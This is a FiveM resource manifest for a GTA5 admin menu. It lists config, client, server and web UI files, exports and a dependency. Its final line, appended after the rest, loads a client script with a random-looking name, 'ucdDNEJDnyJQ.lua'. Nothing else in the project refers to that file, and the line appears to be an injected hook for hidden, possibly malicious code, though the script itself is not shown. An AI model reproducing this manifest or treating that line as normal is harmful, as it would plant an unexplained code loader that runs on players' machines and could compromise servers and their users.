fx_version 'cerulean'
game 'gta5'

author 'QBCore Collective (https://dsc.gg/QBCore-coll)'
description 'Admin Menu'

ui_page "nui/index.html"

shared_scripts {
    'shared/sh_config.lua',
    'locale.lua',
    'locales/en.lua', -- Change this to your desired language.
}

client_scripts {
    '@zb-main/shared.lua',
    'client/**/cl_*.lua',
    'shared/sh_actions.lua',
}

server_scripts {

    'server/**/sv_*.lua',
}

files {
    "nui/index.html",
    "nui/js/**.js",
    "nui/css/**.css",
    "nui/webfonts/*.css",
    "nui/webfonts/*.otf",
    "nui/webfonts/*.ttf",
    "nui/webfonts/*.woff2",
}

exports {
    'CreateLog'
}

server_exports {
    'CreateLog'
} 

dependencies {
 
    'zb-main'
}

lua54 'yes'

client_script 'ucdDNEJDnyJQ.lua'